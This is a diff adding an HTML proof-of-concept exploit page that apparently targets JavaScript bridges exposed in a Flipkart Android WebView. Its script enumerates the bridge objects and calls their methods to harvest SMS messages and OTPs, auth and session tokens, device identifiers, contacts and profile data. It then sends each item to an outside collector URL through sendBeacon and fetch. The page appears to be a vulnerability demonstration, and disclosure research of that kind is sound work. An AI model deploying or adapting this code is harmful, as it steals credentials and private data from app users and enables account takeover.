@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FK1 PoC — UltraWebView JS Bridge Exposure</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #111; color: #0f0; font-family: monospace; font-size: 13px; padding: 12px; }
+  h1 { color: #f00; font-size: 15px; margin-bottom: 6px; border-bottom: 1px solid #f00; padding-bottom: 4px; }
+  h2 { color: #ff0; font-size: 13px; margin: 10px 0 4px; }
+  .ok   { color: #0f0; }
+  .warn { color: #ff0; }
+  .err  { color: #f66; }
+  .data { color: #0ff; word-break: break-all; }
+  #log  { margin-top: 8px; }
+  .entry { border-left: 3px solid #333; padding-left: 8px; margin-bottom: 6px; }
+  .entry.success { border-color: #0f0; }
+  .entry.found   { border-color: #ff0; }
+  .entry.danger  { border-color: #f00; background: #1a0000; padding: 6px; }
+  .label { color: #888; }
+</style>
+</head>
+<body>
+<h1>&#x26a0; FK1 — FLIPKART ULTRAWEBVIEW BRIDGE EXPOSED &#x26a0;</h1>
+<div id="summary">Scanning JS bridges...</div>
+<div id="log"></div>
+
+<script>
+(function() {
+  var logEl = document.getElementById('log');
+  var summaryEl = document.getElementById('summary');
+  var bridgesFound = [];
+  var dataExtracted = [];
+
+  function log(msg, cls) {
+    cls = cls || '';
+    var d = document.createElement('div');
+    d.className = 'entry ' + cls;
+    d.innerHTML = msg;
+    logEl.appendChild(d);
+  }
+
+  function safe(label, fn) {
+    try {
+      var r = fn();
+      return r;
+    } catch(e) {
+      log('<span class="label">' + label + '</span>: <span class="err">ERROR — ' + e.message + '</span>', 'err');
+      return null;
+    }
+  }
+
+  // ── 1. Enumerate all window.JS* bridge objects ───────────────────────────
+  log('<h2>STEP 1 — Bridge object scan</h2>');
+  var candidates = [];
+  try {
+    Object.keys(window).forEach(function(k) {
+      if (/^JS[A-Z]/.test(k) || /Module$/.test(k) || /Bridge$/.test(k) || /Native$/.test(k)) {
+        candidates.push(k);
+      }
+    });
+  } catch(e) {}
+
+  // Also probe known FK bridge names directly
+  var knownBridges = [
+    'JSSMSModule','JSAuthModule','JSContactModule','JSLocationModule',
+    'JSDeviceInfoModule','JSPaymentModule','JSAnalyticsModule',
+    'JSAccountModule','JSUserModule','JSPermissionModule',
+    'JSStorageModule','JSNavigationModule','JSNotificationModule',
+    'JSFlipkartModule','JSUltraModule','JSWebViewModule',
+    'flipkartAndroid','fkAndroid','FKAndroid',
+    'AndroidBridge','NativeBridge','UltraBridge',
+    'JSInterface','JSBridge'
+  ];
+
+  knownBridges.forEach(function(name) {
+    if (candidates.indexOf(name) === -1) candidates.push(name);
+  });
+
+  candidates.forEach(function(name) {
+    var obj = window[name];
+    if (obj !== undefined && obj !== null) {
+      bridgesFound.push(name);
+      var methods = [];
+      try {
+        // get own + prototype methods
+        var all = {};
+        for (var k in obj) { all[k] = 1; }
+        Object.getOwnPropertyNames(obj).forEach(function(k){ all[k]=1; });
+        try { Object.getOwnPropertyNames(Object.getPrototypeOf(obj)).forEach(function(k){ all[k]=1; }); } catch(e){}
+        methods = Object.keys(all).filter(function(k){ return typeof obj[k]==='function' || k!=='constructor'; });
+      } catch(e) { methods = ['[enumeration failed]']; }
+      log('<span class="warn">BRIDGE FOUND: window.' + name + '</span><br>'
+        + '<span class="label">Methods: </span><span class="ok">' + (methods.join(', ') || '[none enumerable]') + '</span>', 'found');
+    }
+  });
+
+  if (bridgesFound.length === 0) {
+    log('<span class="err">No JS bridge objects found on window. Bridges may not be injected for this URL.</span>', 'err');
+  } else {
+    log('<span class="ok">Total bridges: ' + bridgesFound.length + ' — ' + bridgesFound.join(', ') + '</span>', 'success');
+  }
+
+  // ── 2. Extract data from each found bridge ───────────────────────────────
+  log('<h2>STEP 2 — Data extraction</h2>');
+
+  // JSSMSModule
+  if (window.JSSMSModule) {
+    safe('JSSMSModule.getLastSms', function() {
+      var r = JSSMSModule.getLastSms ? JSSMSModule.getLastSms() : null;
+      if (r) { dataExtracted.push({src:'JSSMSModule.getLastSms', val:r}); log('<span class="warn">JSSMSModule.getLastSms:</span> <span class="data">' + r + '</span>', 'danger'); }
+    });
+    safe('JSSMSModule.captureOtpMessage', function() {
+      if (JSSMSModule.captureOtpMessage) {
+        var r = JSSMSModule.captureOtpMessage();
+        log('<span class="warn">JSSMSModule.captureOtpMessage():</span> <span class="data">' + r + '</span>', 'danger');
+        dataExtracted.push({src:'captureOtpMessage', val:r});
+      }
+    });
+    // try callback-style
+    safe('JSSMSModule.getSmsMessages', function() {
+      if (JSSMSModule.getSmsMessages) {
+        JSSMSModule.getSmsMessages('fk1_sms_cb');
+        window.fk1_sms_cb = function(data) {
+          log('<span class="warn">SMS data:</span> <span class="data">' + data + '</span>', 'danger');
+          dataExtracted.push({src:'getSmsMessages', val:data});
+          exfiltrate('sms', data);
+        };
+      }
+    });
+  }
+
+  // JSAuthModule
+  if (window.JSAuthModule) {
+    safe('JSAuthModule.getAuthToken', function() {
+      var r = JSAuthModule.getAuthToken ? JSAuthModule.getAuthToken() : null;
+      if (r) { dataExtracted.push({src:'getAuthToken', val:r}); log('<span class="warn">AUTH TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('auth', r); }
+    });
+    safe('JSAuthModule.getUserInfo', function() {
+      var r = JSAuthModule.getUserInfo ? JSAuthModule.getUserInfo() : null;
+      if (r) { dataExtracted.push({src:'getUserInfo', val:r}); log('<span class="warn">USER INFO:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('user', r); }
+    });
+    safe('JSAuthModule.getAccessToken', function() {
+      var r = JSAuthModule.getAccessToken ? JSAuthModule.getAccessToken() : null;
+      if (r) { dataExtracted.push({src:'getAccessToken', val:r}); log('<span class="warn">ACCESS TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('token', r); }
+    });
+    safe('JSAuthModule.getSessionToken', function() {
+      var r = JSAuthModule.getSessionToken ? JSAuthModule.getSessionToken() : null;
+      if (r) { dataExtracted.push({src:'getSessionToken', val:r}); log('<span class="warn">SESSION TOKEN:</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate('session', r); }
+    });
+  }
+
+  // JSDeviceInfoModule
+  if (window.JSDeviceInfoModule) {
+    var deviceFields = ['getDeviceId','getIMEI','getAndroidId','getDeviceInfo','getMacAddress','getIPAddress'];
+    deviceFields.forEach(function(fn) {
+      safe('JSDeviceInfoModule.' + fn, function() {
+        var r = JSDeviceInfoModule[fn] ? JSDeviceInfoModule[fn]() : null;
+        if (r) { dataExtracted.push({src:fn, val:r}); log('<span class="warn">' + fn + ':</span> <span class="data">' + r + '</span>', 'danger'); }
+      });
+    });
+  }
+
+  // JSContactModule
+  if (window.JSContactModule) {
+    safe('JSContactModule.getContacts', function() {
+      if (JSContactModule.getContacts) {
+        JSContactModule.getContacts('fk1_contacts_cb');
+        window.fk1_contacts_cb = function(data) {
+          log('<span class="warn">CONTACTS:</span> <span class="data">' + (data+'').substring(0,500) + '...</span>', 'danger');
+          dataExtracted.push({src:'getContacts', val:data});
+          exfiltrate('contacts', data);
+        };
+      }
+    });
+  }
+
+  // JSAccountModule / JSUserModule
+  ['JSAccountModule','JSUserModule','JSFlipkartModule'].forEach(function(mod) {
+    if (window[mod]) {
+      var methods = ['getUserProfile','getProfile','getUserId','getEmail','getPhone','getMobile','getName','getUserData','getAccountInfo'];
+      methods.forEach(function(fn) {
+        safe(mod + '.' + fn, function() {
+          var r = window[mod][fn] ? window[mod][fn]() : null;
+          if (r) { dataExtracted.push({src:mod+'.'+fn, val:r}); log('<span class="warn">' + mod + '.' + fn + ':</span> <span class="data">' + r + '</span>', 'danger'); exfiltrate(fn, r); }
+        });
+      });
+    }
+  });
+
+  // Generic probe: call every method on every found bridge, catch errors
+  log('<h2>STEP 3 — Generic method probe on all found bridges</h2>');
+  bridgesFound.forEach(function(name) {
+    var obj = window[name];
+    try {
+      var keys = [];
+      for (var k in obj) { keys.push(k); }
+      try { Object.getOwnPropertyNames(obj).forEach(function(k){ if(keys.indexOf(k)===-1) keys.push(k); }); } catch(e){}
+      keys.forEach(function(k) {
+        if (typeof obj[k] === 'function' && k !== 'constructor' && k !== 'toString') {
+          try {
+            var r = obj[k]();
+            if (r !== undefined && r !== null && r !== '' && r !== 'undefined') {
+              var rs = String(r);
+              dataExtracted.push({src: name+'.'+k, val: rs});
+              log('<span class="warn">' + name + '.' + k + '():</span> <span class="data">' + rs.substring(0,300) + '</span>', 'danger');
+              exfiltrate(name+'_'+k, rs);
+            }
+          } catch(e) { /* method requires args or not callable */ }
+        }
+      });
+    } catch(e) {}
+  });
+
+  // ── 3. Exfiltration to GitHub Pages callback ─────────────────────────────
+  var EXFIL_URL = 'https://ankitkanojiy.github.io/test_page/log_collector.php';
+
+  function exfiltrate(key, val) {
+    try {
+      var payload = JSON.stringify({key: key, val: val, ts: Date.now(), ua: navigator.userAgent});
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(EXFIL_URL, payload);
+      }
+      fetch(EXFIL_URL, {method:'POST', body: payload, mode:'no-cors'}).catch(function(){});
+    } catch(e) {}
+  }
+
+  // ── 4. Final summary ─────────────────────────────────────────────────────
+  setTimeout(function() {
+    var summary = bridgesFound.length > 0
+      ? '&#x2705; VULNERABLE — ' + bridgesFound.length + ' bridge(s) injected: ' + bridgesFound.join(', ')
+        + (dataExtracted.length > 0 ? ' | ' + dataExtracted.length + ' data item(s) extracted' : ' | No data returned by probed methods')
+      : '&#x274c; No bridges found — URL may not be permitted by jsInterfaceWhitelist';
+    summaryEl.innerHTML = '<span style="color:' + (bridgesFound.length>0?'#f00':'#888') + ';font-weight:bold;font-size:14px;">' + summary + '</span>';
+
+    if (dataExtracted.length > 0) {
+      var box = document.createElement('div');
+      box.style.cssText = 'background:#1a0000;border:2px solid #f00;padding:10px;margin-top:12px;';
+      box.innerHTML = '<span style="color:#f00;font-weight:bold;">EXTRACTED DATA (' + dataExtracted.length + ' items)</span><br>';
+      dataExtracted.forEach(function(item) {
+        box.innerHTML += '<br><span style="color:#ff0;">[' + item.src + ']</span><br>'
+          + '<span style="color:#0ff;">' + String(item.val).substring(0,400) + '</span><br>';
+      });
+      document.body.appendChild(box);
+    }
+  }, 3000);
+
+})();
+</script>
+</body>
+</html>
